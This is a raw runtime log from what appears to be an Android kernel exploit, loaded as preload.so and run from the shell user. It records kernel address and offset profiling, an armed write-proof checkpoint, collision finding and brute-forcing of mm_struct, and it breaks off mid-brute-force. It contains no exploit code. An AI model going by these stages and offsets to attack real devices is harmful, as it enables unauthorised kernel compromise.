===== preload.so crash-safe log =====
path=/storage/emulated/0/Download/.temp/log_1788954021.txt tmp=/data/local/tmp/.temp/log_1788954021.txt pid=14453 uid=2000
1788954021.409 14453 [+] preload starting pid=14453
1788954021.458 14453 [+] startup context pid=14453 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
1788954021.462 14453 [+] build config pid=14453 label=pd2238_os6_163150_w10 slide=pselect main=pselect
1788954021.463 14453 [+] p0 profile pid=14453 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 init_task=ffffffc00aaec240 root_tg=ffffffc00ad33100
1788954021.464 14453 [+] direct-map base=ffffff8040000000 slide=0000000000000000
1788954021.465 14453 [+] ckpt: WRITE-PROOF armed bootid_store=ffffff8042ee9110 bootid_buf=ffffff8042ee910d before=4f0f231c-722b-4339-8706-adfbdcc2f823 (odd: leaked scratch, even: aligned bootid+3)
1788954023.075 14453 [*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
1788954025.573 14453 [*] pile-up verified: approx_time=2316
1788954025.579 14453 [*] start finding collisisons
1788954025.582 14453 [*] target    00000074376020c8
1788954026.201 14453 [*]   00000061a28974b8
1788954027.019 14453 [*]   00000061a2f359a8
1788954028.274 14453 [*]   00000061a3c50280
1788954028.591 14453 [*]   00000061a3c9d4e8
1788954029.428 14453 [*]   00000061a44351a8
1788954029.964 14453 [*]   00000061a47a3d18
1788954030.494 14453 [*]   00000061a4ae1708
1788954030.933 14453 [*]   00000061a4d73b98
1788954031.316 14453 [*]   00000061a4f20900
1788954031.606 14453 [*]   00000061a4fc4e20
1788954032.208 14453 [*]   00000061a535aad0
1788954034.571 14453 [*]   00000061a6f22910
1788954036.114 14453 [*]   00000061a8084420
1788954036.381 14453 [*]   00000061a821e0f0
1788954037.090 14453 [*]   00000061a885e2f0
1788954037.095 14453 [*] found 15 collisisons
1788954041.600 14453 [*] start bruteforcing
1788954041.605 14453 [*] [  1] start finding mm_struct [ffffff8800000000-ffffff9000000000]
1788954041.605 14453 [*] [  3] start finding mm_struct [ffffff9800000000-ffffffa000000000]
1788954041.605 14453 [*] [  2] start finding mm_struct [ffffff9000000000-ffffff9800000000]
1788954041.606 14453 [*] [  5] start finding mm_struct [ffffffa800000000-ffffffb000000000]
